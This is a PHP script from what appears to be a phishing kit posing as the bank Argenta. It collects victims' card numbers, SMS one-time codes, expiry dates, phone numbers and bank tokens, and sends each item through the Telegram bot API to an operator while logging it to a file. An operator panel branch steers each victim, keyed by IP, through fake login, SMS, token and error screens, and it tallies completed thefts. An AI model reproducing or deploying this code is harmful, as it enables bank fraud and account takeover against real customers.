<?php
    error_reporting(0);
    session_start();

    require("../libraries/UserInfo.php");
    require_once('../libraries/geoplugin.class.php');
	include "../setting/config.php";
	include "../setting/functions.php";

    $geoplugin = new geoPlugin();
    $geoplugin->locate();
    $ip = get_client_ip();

    $link_panel = $_SESSION["panel_control"];
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = $link_panel;
    
    $keyboard = json_encode([
        "inline_keyboard" => [

                [
                    [
                        "text" => '🕹 PaneL Control For  : [ ' . get_client_ip() . " - " . $geoplugin->countryCode.' ]',
                        "url" => "$link_panel"
                    ]
    
                ],
        ]
    ]);

    if($_SERVER['REQUEST_METHOD'] === 'POST'){
        if($_POST['step'] === 'login'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";
            $json_data = file_get_contents($jsonFilePath);
            $user_data = json_decode($json_data, true);
            $user_data['redirect_user'] = " ";
            $updated_json_data = json_encode($user_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            if (isset($_POST['send_data_1'])) {
                // Info User :
                $cc = $_POST['j_cardnumber'];
            
                // Send Data To Telegram Bot :
                $message =
                "🔐==== [ Argenta ] ====🔐\r\n".
                "[ 💳 Card Number ] : " . $cc ."\r\n".
                "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
                "🔐==== [ Argenta ] ====🔐\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "==== [ Argenta ] ====\r\n".
                "[ Card Number ] " . $cc ."\r\n".
                "IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
                "==== [ Argenta ] ====\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $user_data['data']['data_1'] = $message_to_file;
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
            }
            header('Location: ../pages/loading.php');
            
        }
        elseif($_POST['step'] === 'sms'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";
            $json_data = file_get_contents($jsonFilePath);
            $user_data = json_decode($json_data, true);
            $user_data['redirect_user'] = " ";
            $updated_json_data = json_encode($user_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            if (isset($_POST['send_data_2'])) {
                // Info User :
                $mss = $_POST['otp'];
                
                // Send Data To Telegram Bot :
                $message = 
                "📲==== [ Code SMS ] ====📲\r\n".
                "[ Code SMS ] : " . $mss ."\r\n".
                "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
                "📲==== [ Argenta ] ====📲\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "==== [ Code SMS lOGIN ] ====\r\n".
                "[ Code SMS ] " . $mss ."\r\n".
                "IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
                "==== [ Code SMS lOGIN ] ====\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $user_data['data']['data_2'] = $message_to_file;
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
            }

            header('Location: ../pages/loading.php');

        } 
        elseif($_POST['step'] === 'exp'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";
            $json_data = file_get_contents($jsonFilePath);
            $user_data = json_decode($json_data, true);
            $user_data['redirect_user'] = " ";
            $updated_json_data = json_encode($user_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            if (isset($_POST['send_data_3'])) {
                // Info User :
                $phone = $_POST['num'];
                $expp = $_POST['expp'];
            
                // Send Data To Telegram Bot :
                $message =
                "📅==== [ EXP ] ====📅\r\n".
                "[ Exp ] : " . $expp ."\r\n".
                "[ Phone ] : " . $phone ."\r\n".
                "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
                "📅==== [ Argenta ] ====📅\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "==== [ EXP ] ====\r\n".
                "[ Exp ] " . $expp ."\r\n".
                "[ Phone ] " . $phone ."\r\n".
                "IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
                "==== [ Argenta ] ====\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $user_data['data']['data_3'] = $message_to_file;
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
            }
            header('Location: ../pages/loading.php');
            
        }
        elseif($_POST['step'] === 'token'){
            $target = $_POST['ip'];
            $jsonFilePath = "../panel/storage/{$target}.json";
            $json_data = file_get_contents($jsonFilePath);
            $user_data = json_decode($json_data, true);
            $user_data['redirect_user'] = " ";
            $updated_json_data = json_encode($user_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            if (isset($_POST['send_data_4'])) {
                // Info User :
                $token = $_POST['token1'];
            
                // Send Data To Telegram Bot :
                $message =
                "🔐==== [ Token ] ====🔐\r\n".
                "[ Token ] : ". $token ."\r\n".
                "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
                "🔐==== [ Argenta ] ====🔐\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "==== [ Token ] ====\r\n".
                "[ Token ] " . $token ."\r\n".
                "IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
                "==== [ Argenta ] ====\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $user_data['data']['data_4'] = $message_to_file;

                $updated_json_data = json_encode($user_data);
    
                file_put_contents($jsonFilePath, $updated_json_data);
            }
            header('Location: ../pages/loading.php');            
        }
        elseif($_POST['step'] === 'panel'){

            if($_POST['to'] === 'login'){
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "login"; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);

            }
            elseif($_POST['to'] === 'login-error'){
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "login-error"; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
            }
            elseif($_POST['to'] === 'sms'){
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "sms"; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
            }
            elseif($_POST['to'] === 'sms-error'){
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "sms-error"; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
            }
            elseif($_POST['to'] === 'exp'){
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "exp"; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);

            }
            elseif($_POST['to'] === 'exp-error'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "exp-error"; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
                
            }
            elseif($_POST['to'] === 'token'){
                $token = $_POST['token'];
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "token"; 
                $user_data['token'] = $token; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
                
            }
            elseif($_POST['to'] === 'token-error'){
                $token = $_POST['token'];
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "token-error"; 
                $user_data['token'] = $token;
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
                
            }
            elseif($_POST['to'] === 'confirmed'){

                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "confirmed"; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);

                $statics_file = "../panel/get-panel/statics.json";
                $statics_data = file_get_contents($statics_file);
                $data_main_panel = json_decode($statics_data, true);
                $data_main_panel['total_done_steps'] += 1;
                $updated_statics_data = json_encode($data_main_panel);
                file_put_contents($statics_file, $updated_statics_data);
                
            }
            elseif($_POST['to'] === 'approve'){
                $target = $_POST['id_vip'];
                $file_name = str_replace(".", "-", $target);
                $jsonFilePath = "../panel/storage/{$file_name}.json";
                $json_data = file_get_contents($jsonFilePath);
                $user_data = json_decode($json_data, true);
                $user_data['redirect_user'] = "approve"; 
                $updated_json_data = json_encode($user_data);
                file_put_contents($jsonFilePath, $updated_json_data);
            }
            header('Location: ./panel.php?id_user='. $_POST["id_vip"].'');
        }

    } else {
        header('Location: ../index.php');
    }
?>